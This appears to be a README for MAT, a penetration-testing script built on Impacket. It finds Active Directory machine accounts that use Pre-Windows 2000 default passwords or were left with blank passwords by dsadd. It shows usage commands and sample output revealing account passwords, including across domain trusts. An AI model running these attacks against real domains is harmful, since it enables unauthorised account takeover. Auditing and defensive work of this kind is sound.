# Overview
So, MAT (Machine Account aTtack) was born because I got annoyed with existing tools being super fussy about syntax and not really supporting cross-domain trusts. 

### What is MAT?
MAT is the Machine Account aTtack script written using Impacket (a library for manipulating Windows protocols)- it does exactly as it describes. It attacks machine accounts. 

### How does MAT attack Machine Accounts?
Good question! Specifically, it attempts two types of attacks:
1. It attempts to abuse a flaw with Pre-Windows 2000 machine accounts. Essentially, this is an option that set's the password of the account to the computer name, all lowercase, with a max of 14 characters long. Say your PC name is ABCDEFGHIJKLMNOPQRSTUVWXYZ, it's account name will be ABCDEFGHIJKLMNO$, and it's password will be abcdefghijklmn.
2. The second flaw MAT attempts to abuse is pre-created machine accounts with the dsadd command. If a Domain Administrator creates an account using this command, it simply set the password to nothing. Seriously. ''. That's it.

For more reading on flaws with pre-created machine accounts, I'd highly recommend reading [@Oddvarmoe](https://twitter.com/Oddvarmoe)'s blog post on the flaw. This isn't the first time I've run into this in an engagement. In fact, one of my first password audits I was running, we noticed this very weird flaw (a whole bunch of machine accounts w/ effectively no password.) 2~ years later, this awesome blog post comes out. Mystery solved 2 years later. Funny how things come back around.
https://trustedsec.com/blog/diving-into-pre-created-computer-accounts

### Usage - WIP
Please note this is subjective to change as the tool is further developed.
```bash
root@pandorasbox #~: mat.py nanaisu.com/ronnie:'P@ssw0rd123!'@dc.nanaisu.com                                                                                                                               
[INFO] KDC nanaisu.com
[DEBUG INFO] No target domain specified - parsing from target string
[DEBUG INFO] Base DN dc=nanaisu,dc=com
[+] Successfully Retrieved a list of computers: 11 found
[SUCCESS] Pre-Windows 2000 Machine Account Found - Username: COMP$ Password: comp
[SUCCESS] Machine account created with dsadd Found - Username: COMP2$ Password: 
[SUCCESS] Machine account created with dsadd Found - Username: WK20$ Password: 
[SUCCESS] Pre-Windows 2000 Machine Account Found - Username: ABCDEFGHIJKLMNO$ Password: abcdefghijklmn
```

Cross Domain Trusts:
```bash
root@pandorasbox #~: mat.py -target-domain msp.local nanaisu.com/ronnie:'P@ssw0rd123!'@msp.local
[INFO] KDC msp.local
[DEBUG INFO] Tagret domain specified
[DEBUG INFO] Base DN dc=msp,dc=local
[+] Successfully Retrieved a list of computers: 3 found
[SUCCESS] Machine account created with dsadd Found - Username: COMPTEST$ Password: 
[SUCCESS] Machine account created with dsadd Found - Username: COMPTEST2$ Password: 
```

### Honorable Mentions
Thank you to everyone who's contributed to Impacket, especially the example scripts - they were vital for helping create the tool. Some code is borrowed from GetUserSPNs.py (LDAP queries and parsing the results), SMBClient.py (syntax for establishing a connection to an SMB Server), and SecretsDump.py for arg parsing. Thank you to the amazing people who figured out how in the world they work. Your example scripts are infinitely helpful as always <3
I also plagarized a bit off myself for [cross-domain trust support](https://github.com/fortra/impacket/pull/1717).
